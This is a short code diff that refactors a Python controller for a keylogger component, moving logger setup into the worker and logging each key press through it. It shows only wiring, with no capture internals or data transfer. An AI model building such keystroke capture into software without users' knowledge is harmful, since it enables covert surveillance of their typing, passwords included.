@@ -1,15 +1,14 @@
-from ..components.keylogger import KeyLogger
-from ..loggers import Loggers
+from ..core.components import KeyLogger
 
 
 class KeyLoggerController:
     def __init__(self):
         self.worker = KeyLogger()
         self.worker.KEY_PRESSED.connect(self, "onKeyPress")
-        self.logger = Loggers.getNewLogger("keys")
+        self.worker.initLogger("keys")
 
     def startWorker(self):
         self.worker.start()
 
     def onKeyPress(self, key):
-        self.logger.info(key)
+        self.worker.log(key)
